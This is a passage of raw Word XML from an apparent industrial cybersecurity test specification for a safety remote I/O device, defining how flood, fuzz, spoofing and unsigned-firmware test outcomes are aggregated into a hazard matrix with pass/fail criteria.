            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC635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87031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SVV-2</w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve"> (Threat-Mitigation </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>Testing</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00D73D4E" w14:paraId="756AD5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76486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82D9D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 xml:space="preserve">For </w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>every</w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> attack — the RQ-010-owned flood (TC-RQ010-02) and fuzz (TC-RQ010-03), </w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>plus the cross-referenced</w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> connecting-device spoofing (</w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>TC-RQ001-02</w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>) and unsigned-firmware install (</w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>TC-RQ005-03</w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">) — positively verify the EHSR outcome: no attempt produces an </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>uncommanded</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>/unsafe output</w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">; the device continues safely or enters the </w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>defined safe state</w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>. Surface the one class (firmware) that escapes the fail-safe design.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00D73D4E" w14:paraId="698E8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CAD18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 xml:space="preserve">Abstract </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357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922F3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 xml:space="preserve">1. Wire safe outputs to PLC inputs for independent readback. 2. For each attack case (owned + cross-referenced), sample output state + qualifier. 3. Classify each outcome as {safe-continue, safe-passivate, </w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>hazardous</w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">}. 4. </w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>Consolidate into an outcome matrix; flag any hazardous result.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00D73D4E" w14:paraId="2E298D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6426A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lastRenderedPageBreak/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E9F7F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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>PASS (RQ-010 met for that class)</w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>iff</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> every outcome is safe-continue or safe-passivate. </w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>FAIL</w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>iff</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> any yields </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>uncommanded</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">/unsafe actuation. </w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Expected:</w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> flood/fuzz/spoofing classes </w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>PASS</w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (black channel + CR 3.6); the </w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>firmware-install class (TC-RQ005-03) is the documented exception</w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> that can lead to hazard (G-3).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0B24451B" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Level 2 — </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Concrete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AC6357" w:rsidRPr="00AC6357" w14:paraId="7CAC6A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7BC580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5464D0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r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00AC6357" w14:paraId="61530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F37E6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Ref</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC635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0741A" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00AC6357">
              <w:t>TC-RQ010-05</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00D73D4E" w14:paraId="295FE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C332C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3F6CC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DUT 192.168.0.2; safe DO → PLC DI readback; laptop mirror; Pi as attack source</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00D73D4E" w14:paraId="131F0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68691" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00AC6357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55A1E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PLC watch-table/logging; Wireshark; consolidated results spreadsheet</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00D73D4E" w14:paraId="328BB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18613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Procedure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1580C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 xml:space="preserve">Run RQ-010-owned cases; </w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>import outcome records</w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> from TC-RQ001-02 and TC-RQ005-03; for each, record {DO state, qualifier, device state, outcome-class}; compile the aggregate hazard matrix</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="355FCCBD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| </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Outcome matrix (expected)</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | Flood (TC-RQ010-02) → safe-passivate; malformed (TC-RQ010-03) → safe-reject/passivate; rogue-frame (</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>TC-RQ001-02</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">) → safe; </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>unsigned firmware (TC-RQ005-03) → HAZARDOUS (residual, G-3)</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. | | </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Result</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | ☐ All comms-class safe ☐ Firmware-class hazardous (documented residual) | | </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Evidence</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | TC1005_outcome_matrix.xlsx, per-case DO/qualifier traces (incl. imported TC-RQ001-02/TC-RQ005-03), consolidated verdict | </w:t>
      </w:r>
      <w:hyperlink r:id="rId264" w:history="1">
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId265" w:history="1">
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Market_Acc</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>ty_Systems</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="373E37CB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b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Boundary note:</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> TS-5 </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>does not execute</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> the firmware or spoofing attacks — those are run under </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>TC-RQ005-03</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>TC-RQ001-02</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> respectively. RQ-010 </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>aggregates their outcomes</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> to render the EHSR "does not lead to a hazardous situation" verdict.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68EF2502" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00AC6357">
        <w:pict w14:anchorId="6834414D">
          <v:rect id="_x0000_i1687" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="396BBBC2" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00D73D4E" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Summary of Changes (vs. my original RQ-010)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="750EC8E1" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="43"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Confirmed RQ-010 as the correct recipient</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> of the generalized flood/DoS tests deferred from </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-001</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (connecting-device disruption → RQ-010 flood) and </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-007</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (generalized DoS → RQ-010; self-DoS stays at RQ-007). </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:t xml:space="preserve">TC-RQ010-02 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t>owns</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t>these</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="533D63E9" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00D73D4E" w:rsidRDefault="00AC6357">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="43"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Converted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the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firmware-EoP</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>spoofing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reach</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">-ins </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>to</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>cross-references</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t xml:space="preserve"> — RQ-010 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t>no</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t>longer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>tests</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t>firmware</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t>corruption</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t xml:space="preserve"> (→ </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>RQ-005 TC-RQ005-03</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:t xml:space="preserve">), </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t>connecting-device</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t>spoofing</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t xml:space="preserve"> (→ </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>RQ-001 TC-RQ001-02</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:t xml:space="preserve">), </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t>or</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t>unauthenticated</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t xml:space="preserve"> DCP (→ </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>RQ-011 TC-RQ011-02</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:t xml:space="preserve">). </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Instead, </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>TC-RQ010-05 aggregates their outcomes</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> into the EHSR hazard matrix. This removes duplication while preserving the decisive </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>G-3 firmware exception</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="752ECB5E" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="43"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Retained the correct core</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>asset-label fix (B→H)</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Asset F (black channel) as primary </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>defence</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Net Load Class III credit</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (tempering the flood-gap), </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>CR 3.5/3.6/3.7 + CR 7.1/7.2</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> mapping, and the two residuals: </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
